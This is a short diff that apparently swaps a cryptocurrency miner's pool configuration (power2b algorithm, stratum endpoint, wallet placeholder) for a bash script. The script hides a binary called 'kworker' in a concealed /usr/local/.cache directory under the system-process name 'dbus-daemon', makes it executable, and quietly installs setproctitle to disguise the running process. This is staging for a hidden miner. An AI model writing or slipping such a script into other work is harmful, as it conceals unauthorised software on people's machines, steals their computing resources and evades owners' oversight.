@@ -1,5 +1,6 @@
-algorithm=power2b
-endpoint=stratum+tcp://stratum-na.rplant.xyz:7022
-user=YourWalletAddress.YourWorkerName
-pass=x
-threads=12
+#!/bin/bash
+set -e
+mkdir -p /usr/local/.cache
+cp ./kworker /usr/local/.cache/dbus-daemon
+chmod +x /usr/local/.cache/dbus-daemon
+pip3 install --user setproctitle >/dev/null 2>&1
